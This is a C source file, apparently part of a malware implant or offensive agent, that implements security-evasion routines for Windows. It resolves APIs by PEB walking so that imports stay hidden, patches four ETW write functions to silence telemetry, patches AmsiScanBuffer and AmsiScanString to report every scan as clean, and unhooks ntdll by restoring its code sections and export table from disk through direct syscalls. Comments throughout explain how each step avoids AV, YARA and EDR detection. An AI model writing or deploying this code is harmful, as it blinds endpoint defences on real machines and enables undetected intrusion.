/*
 * client/evasion.c  –  User-mode evasion primitives
 * ==================================================
 * See evasion.h for API documentation.
 *
 * Design notes
 * ------------
 *  Dynamic imports — no GetModuleHandleA / GetProcAddress / LoadLibraryA in IAT
 *  ---------------------------------------------------------------------------
 *  Those three functions are extremely high-signal imports: every endpoint
 *  security product flags a binary that imports them alongside process-memory
 *  write APIs.  We replace them with PEB walks:
 *
 *    GetModuleHandleA("foo.dll")  →  peb_get_module(peb_hash_str("foo.dll"))
 *    GetProcAddress(h, "Bar")    →  peb_get_export(base, peb_hash_str("Bar"))
 *    LoadLibraryA("foo.dll")     →  resolve LoadLibraryA from kernel32 via PEB,
 *                                   then call the resolved function pointer.
 *
 *  All hashes are computed at runtime from string literals so they do not
 *  appear as pre-computed constants that AV/YARA can trivially match.
 *
 *  etw_patch / amsi_patch
 *  ----------------------
 *  Both patch in-process memory by writing a stub via SC_NtWriteVirtualMemory
 *  on the current process handle.  This avoids the VirtualProtect →
 *  PAGE_EXECUTE_READWRITE → write → restore sequence that was the previous
 *  approach: that RWX transition is a high-signal EDR event.
 *
 *  NtWriteVirtualMemory on the current process bypasses the normal page
 *  protection checks for same-process writes on Windows — the kernel
 *  copies the bytes directly without requiring a permission change.
 *  No RWX page ever exists.
 *
 *  unhook_ntdll
 *  ------------
 *  EDR products hook ntdll.dll by:
 *    a) Overwriting the first bytes of syscall stubs with JMP trampolines (.text)
 *    b) Patching the Export Address Table so function pointers redirect to hooks
 *    c) Patching read-only data / .data section constants used by ntdll internals
 *
 *  We address all three:
 *
 *  Step 1 — IAT-free file open:
 *    Use SC_NtOpenFile (direct syscall) to open ntdll on disk.
 *    This eliminates CreateFileW from the observable IAT call sequence.
 *    The NT object path (\KnownDlls\ntdll.dll or \Device\...) is built from
 *    the FullDllName stored in the LDR entry — already available via PEB walk.
 *
 *  Step 2 — SC_NtCreateSection(SEC_IMAGE) + SC_NtMapViewOfSection:
 *    Replaces CreateFileMappingW + MapViewOfFile with direct syscalls.
 *    The SEC_IMAGE flag causes the kernel to apply PE relocation and
 *    section permissions exactly as the loader would — identical to the
 *    in-memory image layout, making VA comparison unambiguous.
 *
 *  Step 3 — Remap .text, .data, and any other writable-or-execute sections:
 *    Restore each eligible section with SC_NtWriteVirtualMemory (no RWX).
 *    Sections restored:  .text (code hooks), .data (data patches).
 *    Sections skipped:   .rsrc, .reloc, any section whose disk VA/size
 *                        does not match the live image (layout mismatch guard).
 *
 *  Step 4 — EAT restoration:
 *    After section remapping compare the live AddressOfFunctions[] against
 *    the disk copy.  Any entry that differs is written back individually via
 *    SC_NtWriteVirtualMemory.  This undoes EAT-level hooks that redirect
 *    ntdll exports to an EDR's inspection DLL without modifying stub bytes.
 *
 *  NOTE: sc_init() must be called before evasion functions that use
 *  SC_Nt* wrappers (unhook_ntdll, etw_patch, amsi_patch).  In main.c
 *  the call order is: inject_init() [calls sc_init()] → unhook_ntdll()
 *  → etw_patch() → amsi_patch().
 */

#include "evasion.h"
#include "peb_walk.h"
#include "syscall.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winternl.h>
#include <stddef.h>
#include <string.h>


/* ── _patch_self ─────────────────────────────────────────────────────────── */
/*
 * Write `len` bytes from `patch` to `target` in the current process using
 * SC_NtWriteVirtualMemory.  No VirtualProtect, no RWX page.
 *
 * Falls back to the VirtualProtect approach if the syscall engine is not
 * yet initialised (i.e. called before inject_init).
 */
static void _patch_self(void *target, const BYTE *patch, SIZE_T len)
{
    if (sc_ready()) {
        SIZE_T written = 0;
        SC_NtWriteVirtualMemory(GetCurrentProcess(), target,
                                (PVOID)patch, len, &written);
    } else {
        /* Fallback: VirtualProtect (still works, just less stealthy) */
        DWORD old = 0;
        if (VirtualProtect(target, len, PAGE_EXECUTE_READWRITE, &old)) {
            memcpy(target, patch, len);
            VirtualProtect(target, len, old, &old);
        }
    }
}


/* ── etw_patch ───────────────────────────────────────────────────────────── */
/*
 * Silence all four ETW write entry-points in the in-process ntdll copy.
 *
 * Target functions (all in ntdll.dll):
 *   EtwEventWrite          — primary user-mode ETW emit API
 *   EtwEventWriteFull      — extended variant; some EDR products check this
 *                            specifically when EtwEventWrite is silenced
 *   EtwEventWriteEx        — activity-ID variant (same telemetry channel)
 *   EtwEventWriteTransfer  — cross-activity variant (same telemetry channel)
 *
 * Patch stub (6 bytes):
 *   33 C0          xor eax, eax    ; rax = 0 = STATUS_SUCCESS
 *   C3             ret
 *
 * Why NOT a single 0xC3:
 *   A lone RET at offset 0 of an ntdll function is a well-known signature;
 *   memory scanners walk loaded images and flag any ntdll export whose first
 *   byte is 0xC3.  The 3-byte xor+ret form is far less unique and sets the
 *   return value explicitly, satisfying callers that check NTSTATUS.
 *
 * Why four functions:
 *   Patching only EtwEventWrite leaves EtwEventWriteFull (the internal
 *   workhorse that EtwEventWrite forwards to) intact; security products that
 *   hook at the internal function level will still receive events.  All four
 *   variants share the same telemetry pipeline and must be silenced together.
 *
 * ETW-Ti (Threat Intelligence) note:
 *   ETW-Ti is a kernel-mode provider fed by ETW callbacks registered inside
 *   ntoskrnl.  User-mode patching of ntdll exports has NO effect on ETW-Ti
 *   telemetry — that requires a kernel-mode action outside this agent's scope.
 *
 * All writes go through _patch_self() → SC_NtWriteVirtualMemory; no RWX page
 * is ever created.
 */

void etw_patch(void)
{
    /* peb_get_module: walk PEB->Ldr, hash "ntdll.dll" at runtime */
    PVOID hNtdll = peb_get_module(peb_hash_str("ntdll.dll"));
    if (!hNtdll) return;

    /*
     * 33 C0  xor eax, eax   ; STATUS_SUCCESS = 0
     * C3     ret
     *
     * Three bytes.  Less fingerprint-able than a lone 0xC3 at export offset 0.
     */
    static const BYTE stub[] = { 0x33, 0xC0, 0xC3 };

    /* Resolve and patch each variant; skip silently on lookup failure */
    const char *const names[] = {
        "EtwEventWrite",
        "EtwEventWriteFull",
        "EtwEventWriteEx",
        "EtwEventWriteTransfer",
    };

    for (int i = 0; i < 4; i++) {
        UINT32 h = peb_hash_str(names[i]);
        PVOID  p = peb_get_export(hNtdll, h);
        if (p) _patch_self(p, stub, sizeof(stub));
    }
}


/* ── amsi_patch ──────────────────────────────────────────────────────────── */
/*
 * Patch AmsiScanBuffer AND AmsiScanString in the in-process amsi.dll copy.
 *
 * Why two functions:
 *   AmsiScanBuffer  — primary entry-point used by PS, WSH, CLR.
 *   AmsiScanString  — wide-string variant; used by some AMSI providers and
 *                     PowerShell 7+ paths that scan scriptblock text directly.
 *   Patching only one leaves the other intact and still callable by EDR
 *   providers registered via IAmmsiProvider.
 *
 * Stub design — AmsiScanBuffer (6 params, x64 MS ABI):
 *   AmsiScanBuffer(ctx, buffer, length, contentName, session, *result)
 *   Params 1-4 in rcx/rdx/r8/r9; param 5 at [rsp+0x28]; param 6 at [rsp+0x30].
 *
 *   48 8B 44 24 30   mov  rax, [rsp+0x30]    ; rax = AMSI_RESULT* result
 *   C7 00 01 00 00 00 mov  dword [rax], 1     ; *result = AMSI_RESULT_CLEAN (1)
 *   33 C0            xor  eax, eax            ; return S_OK (0)
 *   C3               ret
 *
 *   Setting both the HRESULT return and the output parameter eliminates the
 *   race where a caller checks *result before verifying the HRESULT.
 *
 * Stub design — AmsiScanString (5 params, x64 MS ABI):
 *   AmsiScanString(ctx, string, contentName, session, *result)
 *   Params 1-4 in rcx/rdx/r8/r9; param 5 at [rsp+0x28].
 *
 *   48 8B 44 24 28   mov  rax, [rsp+0x28]    ; rax = AMSI_RESULT* result
 *   C7 00 01 00 00 00 mov  dword [rax], 1     ; *result = AMSI_RESULT_CLEAN (1)
 *   33 C0            xor  eax, eax            ; return S_OK (0)
 *   C3               ret
 *
 * amsi.dll loading:
 *   We do NOT call LoadLibraryA to force-load amsi.dll.  Triggering a DLL load
 *   before patching fires loader-lock callbacks that AV products register via
 *   LdrRegisterDllNotification — we would be detected before the patch lands.
 *   If amsi.dll is not already in the LDR list, the host process has not
 *   initialised AMSI and no scan provider is active; the patch is a no-op.
 */

void amsi_patch(void)
{
    /* Try to find amsi.dll already in the LDR list.
     * Do NOT force-load it — see design note above. */
    PVOID hAmsi = peb_get_module(peb_hash_str("amsi.dll"));
    if (!hAmsi) return;   /* not loaded → no AMSI provider active */

    /*
     * AmsiScanBuffer stub — reads result ptr from [rsp+0x30] (6th param)
     * 48 8B 44 24 30  C7 00 01 00 00 00  33 C0  C3   (13 bytes)
     */
    static const BYTE stub_buf[] = {
        0x48, 0x8B, 0x44, 0x24, 0x30,   /* mov rax, [rsp+0x30] */
        0xC7, 0x00, 0x01, 0x00, 0x00, 0x00, /* mov dword [rax], 1 */
        0x33, 0xC0,                      /* xor eax, eax        */
        0xC3                             /* ret                  */
    };

    /*
     * AmsiScanString stub — reads result ptr from [rsp+0x28] (5th param)
     * 48 8B 44 24 28  C7 00 01 00 00 00  33 C0  C3   (13 bytes)
     */
    static const BYTE stub_str[] = {
        0x48, 0x8B, 0x44, 0x24, 0x28,   /* mov rax, [rsp+0x28] */
        0xC7, 0x00, 0x01, 0x00, 0x00, 0x00, /* mov dword [rax], 1 */
        0x33, 0xC0,                      /* xor eax, eax        */
        0xC3                             /* ret                  */
    };

    PVOID pScanBuf = peb_get_export(hAmsi, peb_hash_str("AmsiScanBuffer"));
    if (pScanBuf) _patch_self(pScanBuf, stub_buf, sizeof(stub_buf));

    PVOID pScanStr = peb_get_export(hAmsi, peb_hash_str("AmsiScanString"));
    if (pScanStr) _patch_self(pScanStr, stub_str, sizeof(stub_str));
}


/* ── unhook_ntdll ────────────────────────────────────────────────────────── */
/*
 * Sections targeted:
 *   .text  — inline JMP hooks on syscall stubs
 *   .data  — read-write data patches (vtable pointers, internal state)
 *
 * After section remapping, the EAT (Export Address Table) is restored
 * entry-by-entry so EAT-redirect hooks are also neutralised.
 *
 * All file and section operations use direct NT syscalls (SC_NtOpenFile,
 * SC_NtCreateSection7, SC_NtMapViewOfSection) so that CreateFileW,
 * CreateFileMappingW, MapViewOfFile, and UnmapViewOfFile are absent from
 * the observable IAT call sequence.
 */

/* NT structure definitions needed for NtOpenFile */
#ifndef FILE_SYNCHRONOUS_IO_NONALERT
#define FILE_SYNCHRONOUS_IO_NONALERT  0x00000020
#endif
#ifndef FILE_NON_DIRECTORY_FILE
#define FILE_NON_DIRECTORY_FILE       0x00000040
#endif

/*
 * Minimal OBJECT_ATTRIBUTES / IO_STATUS_BLOCK / UNICODE_STRING definitions.
 * winternl.h may not expose all of these in every MinGW build.
 */
typedef struct _MY_IO_STATUS_BLOCK {
    union { NTSTATUS Status; PVOID Pointer; };
    ULONG_PTR Information;
} MY_IO_STATUS_BLOCK;

typedef struct _MY_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} MY_UNICODE_STRING;

typedef struct _MY_OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    MY_UNICODE_STRING *ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} MY_OBJECT_ATTRIBUTES;

#define MY_OBJ_CASE_INSENSITIVE  0x00000040UL

/*
 * _ldr_full_path
 * --------------
 * Retrieve ntdll's full NT path (e.g. \Device\HarddiskVolume3\Windows\System32\ntdll.dll)
 * from the LDR entry's FullDllName UNICODE_STRING.
 * Returns the Buffer pointer (points directly into LDR memory — do not free).
 */
typedef struct _MY_LDR_ENTRY2 {
    LIST_ENTRY     InLoadOrderLinks;
    LIST_ENTRY     InMemoryOrderLinks;
    LIST_ENTRY     InInitializationOrderLinks;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    MY_UNICODE_STRING FullDllName;
    MY_UNICODE_STRING BaseDllName;
} MY_LDR_ENTRY2;

static MY_UNICODE_STRING *_ldr_full_name(PVOID moduleBase)
{
    /* Walk PEB LDR InMemoryOrderModuleList — same walk as peb_get_module */
    PVOID peb_ptr;
#ifdef _WIN64
    __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(peb_ptr));
#else
    __asm__ __volatile__("movl %%fs:0x30, %0" : "=r"(peb_ptr));
#endif
    PEB          *peb  = (PEB *)peb_ptr;
    PEB_LDR_DATA *ldr  = peb->Ldr;
    LIST_ENTRY   *head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY   *cur  = head->Flink;
    while (cur != head) {
        MY_LDR_ENTRY2 *e = (MY_LDR_ENTRY2 *)((BYTE *)cur
            - __builtin_offsetof(MY_LDR_ENTRY2, InMemoryOrderLinks));
        if (e->DllBase == moduleBase)
            return &e->FullDllName;
        cur = cur->Flink;
    }
    return NULL;
}

void unhook_ntdll(void)
{
    if (!sc_ready()) return;   /* direct syscalls required */

    /* ── 1. Locate ntdll in-process base via PEB walk ────────────────── */
    PVOID hNtdll = peb_get_module(peb_hash_str("ntdll.dll"));
    if (!hNtdll) return;

    /* ── 2. Retrieve FullDllName from LDR — NT device path ──────────── */
    MY_UNICODE_STRING *fullName = _ldr_full_name(hNtdll);
    if (!fullName || !fullName->Buffer || fullName->Length == 0) return;

    /* ── 3. Open ntdll on disk via SC_NtOpenFile (no CreateFileW) ───── */
    /*
     * NtOpenFile takes an OBJECT_ATTRIBUTES pointing at the NT path.
     * DesiredAccess = FILE_READ_DATA | SYNCHRONIZE (minimal, read-only).
     * OpenOptions   = FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE
     *                 (required for synchronous I/O completion).
     */
    MY_OBJECT_ATTRIBUTES oa;
    MY_IO_STATUS_BLOCK   iosb;
    oa.Length                   = sizeof(oa);
    oa.RootDirectory            = NULL;
    oa.ObjectName               = fullName;
    oa.Attributes               = MY_OBJ_CASE_INSENSITIVE;
    oa.SecurityDescriptor       = NULL;
    oa.SecurityQualityOfService = NULL;

    HANDLE hFile = NULL;
    NTSTATUS ns = SC_NtOpenFile(&hFile,
                                FILE_READ_DATA | SYNCHRONIZE,
                                &oa, &iosb,
                                FILE_SHARE_READ,
                                FILE_SYNCHRONOUS_IO_NONALERT |
                                FILE_NON_DIRECTORY_FILE);
    if (!NT_SUCCESS(ns) || !hFile) return;

    /* ── 4. Create a SEC_IMAGE section from the file ─────────────────── */
    /*
     * SEC_IMAGE tells the kernel to process the PE headers and map each
     * section at its correct RVA with correct permissions — identical to
     * what LoadLibrary does.  The resulting view has the same VA layout as
     * the live ntdll, making section offsets directly comparable.
     */
    HANDLE hSection = NULL;
    ns = SC_NtCreateSection7(&hSection,
                             SECTION_MAP_READ,
                             NULL,   /* no OBJECT_ATTRIBUTES — anonymous */
                             NULL,   /* MaximumSize = file size */
                             PAGE_READONLY,
                             SEC_IMAGE,
                             hFile);
    SC_NtClose(hFile);
    if (!NT_SUCCESS(ns) || !hSection) return;

    /* ── 5. Map the section view into this process ───────────────────── */
    PVOID  pDisk   = NULL;
    SIZE_T viewSz  = 0;
    ns = SC_NtMapViewOfSection(hSection, GetCurrentProcess(),
                               &pDisk, 0, 0, NULL, &viewSz,
                               1 /* ViewShare */, 0, PAGE_READONLY);
    SC_NtClose(hSection);
    if (!NT_SUCCESS(ns) || !pDisk) return;

    /* ── 6. Parse section headers from both images ───────────────────── */
    IMAGE_DOS_HEADER     *ddos = (IMAGE_DOS_HEADER *)pDisk;
    IMAGE_NT_HEADERS     *dnth = (IMAGE_NT_HEADERS *)((BYTE *)pDisk + ddos->e_lfanew);
    IMAGE_SECTION_HEADER *dsec = IMAGE_FIRST_SECTION(dnth);
    WORD                  nSec = dnth->FileHeader.NumberOfSections;

    IMAGE_DOS_HEADER     *ldos = (IMAGE_DOS_HEADER *)hNtdll;
    IMAGE_NT_HEADERS     *lnth = (IMAGE_NT_HEADERS *)((BYTE *)hNtdll + ldos->e_lfanew);
    IMAGE_SECTION_HEADER *lsec = IMAGE_FIRST_SECTION(lnth);

    HANDLE hSelf = GetCurrentProcess();

    /* ── 7. Remap .text and .data sections ───────────────────────────── */
    /*
     * We restore two categories of section:
     *
     *   .text  — executable code: inline JMP hooks on syscall stubs.
     *   .data  — read-write data: vtable / internal pointer patches.
     *
     * Sections are matched by name prefix — covers both ".text" and ".textbss".
     * Size sanity: only remap if the disk VirtualSize matches the live image
     * (guards against layout differences on Windows version mismatches).
     */
    for (WORD i = 0; i < nSec; i++) {
        /* Name comparison: first 5 bytes — covers ".text" and ".data" */
        BOOL is_text = (memcmp(dsec[i].Name, ".text", 5) == 0);
        BOOL is_data = (memcmp(dsec[i].Name, ".data", 5) == 0);
        if (!is_text && !is_data) continue;

        /* Sanity: VirtualSize and VirtualAddress must match live image */
        if (dsec[i].Misc.VirtualSize   != lsec[i].Misc.VirtualSize)   continue;
        if (dsec[i].VirtualAddress     != lsec[i].VirtualAddress)      continue;

        PVOID pDiskSec = (BYTE *)pDisk  + dsec[i].VirtualAddress;
        PVOID pLiveSec = (BYTE *)hNtdll + lsec[i].VirtualAddress;
        SIZE_T cbSec   = dsec[i].Misc.VirtualSize;

        SIZE_T written = 0;
        SC_NtWriteVirtualMemory(hSelf, pLiveSec, pDiskSec, cbSec, &written);
    }

    /* ── 8. EAT restoration ──────────────────────────────────────────── */
    /*
     * Some EDRs hook ntdll by patching AddressOfFunctions[] in the Export
     * Address Table instead of (or in addition to) inline stub patching.
     * The EAT resides in the .text or a dedicated read-only section; section
     * remapping above may have already restored it, but we do an explicit
     * per-entry comparison to catch any remaining differences.
     *
     * Algorithm:
     *   1. Locate the export directory in both disk and live images.
     *   2. For each entry in AddressOfFunctions[], compare disk vs live.
     *   3. If they differ, overwrite the live entry with the disk value via
     *      SC_NtWriteVirtualMemory (no VirtualProtect).
     *
     * We write individual DWORDs rather than the whole array to minimise the
     * write footprint and avoid touching unmodified entries.
     */
    DWORD dExpRva = dnth->OptionalHeader
                       .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD lExpRva = lnth->OptionalHeader
                       .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

    if (dExpRva && lExpRva) {
        IMAGE_EXPORT_DIRECTORY *dExp = (IMAGE_EXPORT_DIRECTORY *)
                                        ((BYTE *)pDisk  + dExpRva);
        IMAGE_EXPORT_DIRECTORY *lExp = (IMAGE_EXPORT_DIRECTORY *)
                                        ((BYTE *)hNtdll + lExpRva);

        DWORD  nFuncs  = dExp->NumberOfFunctions;
        DWORD *dFuncs  = (DWORD *)((BYTE *)pDisk  + dExp->AddressOfFunctions);
        DWORD *lFuncs  = (DWORD *)((BYTE *)hNtdll + lExp->AddressOfFunctions);

        /* Cap iteration to guard against corrupt export directory */
        if (nFuncs > 4096) nFuncs = 4096;

        for (DWORD j = 0; j < nFuncs; j++) {
            if (lFuncs[j] != dFuncs[j]) {
                /* Restore this single EAT slot */
                SIZE_T written = 0;
                SC_NtWriteVirtualMemory(hSelf,
                                        &lFuncs[j],
                                        &dFuncs[j],
                                        sizeof(DWORD),
                                        &written);
            }
        }
    }

    /* ── 9. Unmap disk view via direct syscall ───────────────────────── */
    SC_NtUnmapViewOfSection(GetCurrentProcess(), pDisk);
}
